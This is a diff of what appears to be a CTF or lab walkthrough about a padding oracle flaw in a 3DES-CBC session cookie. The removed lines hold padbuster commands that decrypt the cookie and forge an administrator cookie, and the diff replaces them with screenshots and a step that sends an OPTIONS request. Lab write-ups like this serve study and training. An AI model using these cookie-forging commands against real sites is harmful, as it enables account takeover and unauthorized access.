@@ -64,33 +64,12 @@ hcon=ZQd4aI4x8DBWVdBDTFmtoGMBKw%2FHnWng
 
 Tamper with one character → server returns **"Invalid padding"** → classic Padding Oracle vulnerability (3DES-CBC, block size 8).
 
-### Decrypt cookie
 
-```bash
-padbuster http://$IP/index.php \
-  "ZQd4aI4x8DBWVdBDTFmtoGMBKw%2FHnWng" 8 \
-  -cookies "hcon=ZQd4aI4x8DBWVdBDTFmtoGMBKw%2FHnWng" \
-  -error "Invalid padding" -encoding 4
-```
+<img width="1125" height="571" alt="image" src="https://github.com/user-attachments/assets/0c075ba7-8dea-46f9-9717-531df9310cd7" />
 
-```
-[+] Decrypted value: user=test
-```
+Send an **OPTIONS** request to `/hide-folders/1/`:
 
-Cookie format confirmed: `user=<username>`.
-
-### Forge admin cookie
-
-```bash
-padbuster http://$IP/index.php \
-  "ZQd4aI4x8DBWVdBDTFmtoGMBKw%2FHnWng" 8 \
-  -cookies "hcon=ZQd4aI4x8DBWVdBDTFmtoGMBKw%2FHnWng" \
-  -error "Invalid padding" \
-  -plaintext "user=administratorhc0nwithyhackme" -encoding 4
-```
-
-With the forged admin cookie, send an **OPTIONS** request to `/hide-folders/1/`:
-<img width="1245" height="639" alt="image" src="https://github.com/user-attachments/assets/0e68d6d6-e627-47b0-9fca-e85b8a8a3397" />
+<img width="1557" height="565" alt="image" src="https://github.com/user-attachments/assets/bc53b338-3575-4854-9967-60bc9968a3d8" />
 
 Response:
 
